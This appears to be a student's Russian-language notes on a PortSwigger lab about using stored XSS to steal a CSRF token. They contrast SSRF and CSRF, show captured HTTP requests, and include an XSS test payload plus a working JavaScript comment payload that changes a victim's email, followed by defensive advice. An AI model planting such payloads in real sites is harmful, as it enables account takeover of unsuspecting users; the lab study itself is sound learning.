
я решал лабы только SSRF поэтому немного оперделений про то, что такое CSRF

==ssrf== это когда злоумышленник заставляет **сервер** делать запросы куда ему нужно. сервер думает что это легитимные запросы от самого себя и может открыть доступ к внутренним ресурсам которые снаружи недоступны. например сайт позволяет ввести url картинки и сервер сам её загружает. если вместо картинки подсунуть ссылку на внутренний сервер в локальной сети типа [http://192.168.1.1/admin] то сервер пойдёт туда и вернёт ответ. это атака на сервер

==csrf== это когда злоумышленник заставляет браузер жертвы выполнить нежелательное действие на сайте где жертва уже залогинена. например^ заходишь на сайт злоумышленника а там скрытая форма отправляет запрос на смену пароля на твоём банковском аккаунте. твой браузер сам отправляет этот запрос и твои куки автоматически прилагаются потому что ты уже залогинен. сервер думает что это ты сам поменял пароль. это атака на пользователя

**главное отличие**

>	при SSRF атакуется сервер и запросы идут от сервера  
>	
> 	при CSRF атакуется пользователь и запросы идут от его браузера с его куками

при уязвимости CSRF становится возможны следующие слукчаи:

Смена email, пароля, секретного вопроса
Перевод денег, оформление покупки
Отправка сообщений, удаление записей, добавление прав
Создание нового админа, удаление данных, полный захват контроля
Кража данных
Использование XSS для кражи токена


-----


лаба 
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
##### Exploiting XSS to bypass CSRF defenses // XSS для обхода CSRF-защиты
задание:
оставить пейлоад в комментах, который сможет украсть CSRF-токен
	и получить токен, и потом войдя в свой акк - сменить email адресс этого чела на свой

-----

план:

1. найти XSS уязвимость в комментах
2. получить CSRF токен через эту уязвимость
3. зайти в свой аккаунт и просмотреть запрос который меняет почтовый адрес
4. сформировать пейлоад в комментах - который сможет, при открытии этой страницы с комментами - украсть CSRF и сразу выполнить действие от имени юзера, а конкретно - смену почтового адресса на новый! 
5. а мне после этого действия - нужно будет быстро получить доступ к аккаунту жертвы , но нужно тогда узнать и логин жертвы,, тогда нужно чтобы мой пейлоад еще и отправлял коммент автоматически от лица жертвы с логином


------

я авторизовался и вот запрос который меняет email 
причем пароль меняется одной кнопкой, пожтверждение паролем/кодом не требуется
```http
POST /my-account/change-email HTTP/2
Host: 0ac20094049db98a80ac1c720065009e.web-security-academy.net
Cookie: session=OWCFTKdpFncupkRfMViN0kvi8UM4xKxw
Content-Length: 69
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0ac20094049db98a80ac1c720065009e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac20094049db98a80ac1c720065009e.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=wiener2%40normal-user.net&csrf=zUcnBfnovOyQ4fteYuGzLQNvGiOAKcjf
```
email   это новый адресс
csrf     токен идентификатор
Cookie: session  


-------


сам текст коммента подставляетсся между тегами < p>< /p> без какой либо валидации

```html
<img src=1 onerror=alert(document.cookie)>
```
простой пейлоад срабатывает и высвечивает просто алерт, уязвимость xss подтверждена

------

теперь нужно отследить то, на какой запрос приходит токен CSRF

1 место - при отправке коммента - там браузер подставляем сам  CSRF
2 место проще - запрос GET /my-account?id=wiener HTTP/2 вернет токен CSRF

-----

или просто GET /my-account HTTP/2 
тогда будет авто запрос на GET /login HTTP/2 и ответом прийдет тоже  токен наш < input required type="hidden" name="csrf" value="GGNUKvv9uzOx0aldawwS9tvpLfdC0zY6">

---

в скрытом виде вот так
```html;
<input required type="hidden" name="csrf" value="zUcnBfnovOyQ4fteYuGzLQNvGiOAKcjf">
```

```http
GET /my-account?id=wiener HTTP/2
Host: 0ac20094049db98a80ac1c720065009e.web-security-academy.net
Cookie: session=OWCFTKdpFncupkRfMViN0kvi8UM4xKxw
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0ac20094049db98a80ac1c720065009e.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

значит нужно сделать так, чтобы мой пейлоад в комментарии сделал несколько действий сразу:

1 - это сделал запрос GET /my-account HTTP/2 
2 - получил ответ и в этом ответе нашел токен type="hidden" name="csrf" value=
3 - сформировать запрос на смену почт адресса POST /my-account/change-email HTTP/2 и отправить этот запрос

(и в оригинале  на мой указанный там email прийдет письмо о смене )
а в лабе либо она сразу решиться, либо просто резко смениться емайл
но для входа мне же нужен логин еще..


-------


```js
<script>
var req = new XMLHttpRequest(); // обьект для отправки запроса http без перезгрузки стр браузера

req.onload = handleResponse; // как прийдет ответ - запуск функhandleResponse
req.open('get','/my-account',true); // запрос асинхронно без блока страницы
req.send(); // отправил запрос

function handleResponse() { // функ котор облработает ответ от сервера
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    // this.responseText это весь html из ответа
    // match ловлю значения нужные мне (совпадения)
    
    var changeReq = new XMLHttpRequest();  // обьект для отправки запроса http
    
    changeReq.open('post', '/my-account/change-email', true);// запрос на смену емайл
    
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    //  устанавливается заголовок который говорит серверу что данные будут в формате обычной формы (как если бы заполнил форму на сайте)
    
    
    changeReq.send('csrf='+token+'&email=222@444.com'); // отпр данные вместе с токеном
};

</script>
```


```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&email=222@444.com');
};
</script>
```

лаба решена!

я конечно ничего сделать тут не могу сейчас, но если бы была например функция какая-то восстановления пароля , или смены пароля. то можно было бы это провернуть!

-----

### вывод и защита

во первых - это xss уязвимость
не было никакой валидации и экранирования комментов

csrf токен оказался доступен через javascript так как был в html страницы и не защищён от чтения

почту можно было менять просто - нужно быть авторизованным и все, без кодов подтверждения или ввода пароля

НУЖНО!

экранировать пользовательский ввод при выводе чтобы xss вообще не возникала

использовать httponly куки для защиты сессионных данных

применять content security policy csp запрещающую инлайн скрипты

для важных действий требовать дополнительную проверку например ввод старого пароля

использовать samesite cookies для защиты от csrf

= помнить что csrf токены защищают только от csrf а не от xss



